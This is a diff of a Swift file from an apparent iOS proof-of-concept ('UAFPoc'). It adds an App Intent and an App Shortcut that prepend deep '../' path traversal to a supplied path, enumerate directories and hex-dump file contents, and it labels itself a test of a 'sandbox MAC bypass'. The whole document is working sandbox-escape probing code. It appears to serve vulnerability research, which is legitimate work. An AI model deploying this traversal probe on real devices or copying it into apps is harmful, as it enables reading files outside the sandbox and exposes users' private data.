@@ -1,16 +1,17 @@
+import AppIntents
 import Foundation
 
 // MARK: - ObjC Bridge (callable from ViewController.m via UAFPoc-Swift.h)
 
 @objc public class SwordAppIntentBridge: NSObject {
 
-    /// Entry point for ObjC — tests directory enumeration via Foundation in Swift context
+    /// Entry point for ObjC — tests directory enumeration via App Intents context
     @objc public func enumerateDirectory(_ dirPath: String) -> String {
         let fm = FileManager.default
         let base = "../../../../../../../../../../../../../"
         let fullPath = (base + dirPath as NSString).expandingTildeInPath
 
-        var result = "[Swift Bridge — Foundation only]\n"
+        var result = "[Swift AppIntents Bridge]\n"
         result += "target: \(fullPath)\n"
 
         var isDir: ObjCBool = false
@@ -67,5 +68,79 @@ import Foundation
             return "[+] \(relPath) (\(sz) bytes)\(isDir.boolValue ? " [DIR]" : "")"
         }
         return "[-] \(relPath)"
+    }
+}
+
+// MARK: - App Intent (registered with system for XPC path resolution)
+
+public struct SwordDirectoryIntent: AppIntent {
+    public static var title: LocalizedStringResource = "Enumerate Directory"
+    public static var description = IntentDescription(
+        "Enumerates a directory path — tests sandbox MAC bypass",
+        category: .information
+    )
+
+    @Parameter(
+        title: "Directory Path",
+        description: "Relative path to enumerate (with ../ traversal)",
+        inputOptions: .init(keyboardType: .URL)
+    )
+    var targetPath: String
+
+    public init() {
+        self.targetPath = ""
+    }
+
+    public init(targetPath: String) {
+        self.targetPath = targetPath
+    }
+
+    @MainActor
+    public func perform() async throws -> some IntentResult & ReturnsValue<String> {
+        let fm = FileManager.default
+        let base = "../../../../../../../../../../../../../"
+        let fullPath = (base + targetPath as NSString).expandingTildeInPath
+
+        var output = "[SwordDirectoryIntent]\n"
+        output += "path: \(fullPath)\n"
+
+        var isDir: ObjCBool = false
+        guard fm.fileExists(atPath: fullPath, isDirectory: &isDir) else {
+            return .result(value: output + "NOT FOUND")
+        }
+
+        if isDir.boolValue {
+            if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
+                output += "entries: \(contents.count)\n"
+                for entry in contents.prefix(500) {
+                    output += "  \(entry)\n"
+                }
+            } else {
+                output += "contentsOfDirectory: BLOCKED\n"
+            }
+        } else {
+            if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
+                output += "file size: \(data.count) bytes\n"
+                let preview = data.prefix(200).map { String(format: "%02x", $0) }.joined(separator: " ")
+                output += "hex: \(preview)\n"
+            }
+        }
+
+        return .result(value: output)
+    }
+}
+
+// MARK: - App Shortcut (makes intent available to system)
+
+public struct SwordAppShortcuts: AppShortcutsProvider {
+    public static var appShortcuts: [AppShortcut] {
+        AppShortcut(
+            intent: SwordDirectoryIntent(),
+            phrases: [
+                "Enumerate \(.applicationName) directory"
+            ],
+            shortTitle: "Enum Dir",
+            systemImageName: "folder"
+        )
     }
 }
